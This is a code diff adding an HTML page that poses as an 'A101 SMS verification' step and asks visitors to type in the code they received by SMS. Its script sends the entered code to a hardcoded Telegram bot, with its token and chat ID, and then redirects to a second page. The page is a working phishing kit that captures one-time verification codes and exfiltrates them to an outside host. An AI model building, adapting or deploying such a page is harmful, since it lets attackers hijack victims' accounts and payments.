@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A101 SMS DOGRULAMASI</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4; /* Sayfa arka plan rengi */
+        }
+        #logo {
+            width: 100px;
+            height: 100px;
+            margin-top: 20px; /* Logo ile sayfa üstü arasındaki boşluk */
+            margin-bottom: 20px;
+        }
+        #telegramForm {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #ffffff; /* Form arka plan rengi */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Hafif gölge efekti */
+            max-width: 80%; /* Formun maksimum genişliği */
+            margin: 0 auto; /* Sayfa ortasına hizalama */
+        }
+        #messageText {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            border: 1px solid #ccc; /* Kenarlık rengi */
+            border-radius: 5px;
+        }
+        #submitBtn {
+            padding: 15px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <img id="logo" src="./logo.png" alt="Logo">
+    <form id="telegramForm">
+        <label for="messageText">SMS DOĞRULAMASI</label>
+        <input type="tel" id="messageText" placeholder="" oninput="validateInput(this)" pattern="\d*" required>
+        <button type="button" id="submitBtn" onclick="sendMessage()">Gönder</button>
+    </form>
+
+    <script>
+        function validateInput(input) {
+            input.value = input.value.replace(/\D/g, ''); // Sadece rakamları kabul et
+        }
+
+        function sendMessage() {
+            var messageText = document.getElementById('messageText').value;
+            var apiUrl = 'https://api.telegram.org/bot6310872354:AAEXpycTL7iDBrndrBPpMhr-_aAepxC3VVk/sendMessage';
+            var chatId = '-1002121014985';
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: messageText,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram API Response:', data);
+                window.location.href = 'test2.html';
+            })
+            .catch(error => {
+                console.error('Error sending message:', error);
+                alert('Mesaj gönderilemedi. Hata oluştu.');
+            });
+        }
+    </script>
+</body>
+</html>
